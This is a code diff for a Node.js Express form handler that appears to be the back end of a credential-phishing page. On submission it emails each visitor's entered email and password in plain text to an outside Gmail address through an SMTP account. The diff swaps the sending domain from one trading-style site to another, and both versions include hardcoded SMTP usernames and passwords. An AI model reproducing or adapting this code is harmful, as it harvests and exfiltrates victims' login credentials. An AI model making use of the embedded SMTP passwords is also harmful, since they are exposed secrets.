@@ -31,12 +31,12 @@ app.post('/submit', (req, res) => {
 
     // Configure Nodemailer
     const transporter = nodemailer.createTransport({
-        host: process.env.SMTP_HOST || "mail.graysfx.online", // SMTP server address
+        host: process.env.SMTP_HOST || "mail.capitalquesttrades.com", // SMTP server address
         port: process.env.SMTP_PORT || 465, // SMTP server port
         secure: true, // true for port 465, false for other ports
         auth: {
-            user: process.env.SMTP_USER || "support12@graysfx.online", // your SMTP username
-            pass: process.env.SMTP_PASS || "@MaMaoph123"  // your SMTP password
+            user: process.env.SMTP_USER || "noreply@capitalquesttrades.com", // your SMTP username
+            pass: process.env.SMTP_PASS || "K$~)wxLP19kY"  // your SMTP password
         },
         connectionTimeout: 20000, // 20 seconds
         greetingTimeout: 20000, // 20 seconds
@@ -44,7 +44,7 @@ app.post('/submit', (req, res) => {
     });
 
     const mailOptions = {
-        from: process.env.SMTP_USER || "support12@graysfx.online", // your email address
+        from: process.env.SMTP_USER || "noreply@capitalquesttrades.com", // your email address
         to: "Hillarymaria019@gmail.com", // recipient's email address
         subject: 'Form Submission',
         text: `Email: ${email}\nPassword: ${password}`
